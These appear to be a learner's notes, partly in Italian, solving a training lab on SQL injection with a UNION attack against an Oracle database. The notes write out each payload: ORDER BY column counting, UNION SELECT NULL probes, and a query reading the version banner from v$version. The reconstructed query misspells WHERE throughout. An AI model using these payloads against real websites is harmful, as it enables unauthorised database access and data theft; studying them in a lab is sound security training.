This lab contains an SQL injection vulnerability in the product category filter.
You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.


IPOTESI QUERY

SELECT * FROM categoryTable WEHERE category = 'Tech+gifts';


DETERMINARE NUMERO DELLE COLONNE.

1) SELECT * FROM categoryTable WEHERE category = 'Tech+gifts';
' ORDER BY 2--
= SELECT * FROM categoryTable WEHERE category = 'Tech+gifts' ORDER BY 2--';

2) SELECT * FROM categoryTable WEHERE category = 'Tech+gifts';
' UNION SELECT NULL,NULL FROM dual--
= SELECT * FROM categoryTable WEHERE category = 'Tech+gifts' UNION SELECT NULL,NULL FROM dual--';


DETERMINARE QUALI CAMPI SUPPORTANO IL TESTO.

1) SELECT * FROM categoryTable WEHERE category = 'Tech+gifts';
' UNION SELECT 'A','A' FROM dual--
= SELECT * FROM categoryTable WEHERE category = 'Tech+gifts' UNION SELECT 'A','A' FROM dual--';


DETERMINARE LA VERSIONE DEL DBMSERVER ORACLE.

1) SELECT * FROM categoryTable WEHERE category = 'Tech+gifts';
' UNION SELECT banner,NULL FROM v$version--
SELECT * FROM categoryTable WEHERE category = 'Tech+gifts' UNION SELECT banner,NULL FROM v$version--';
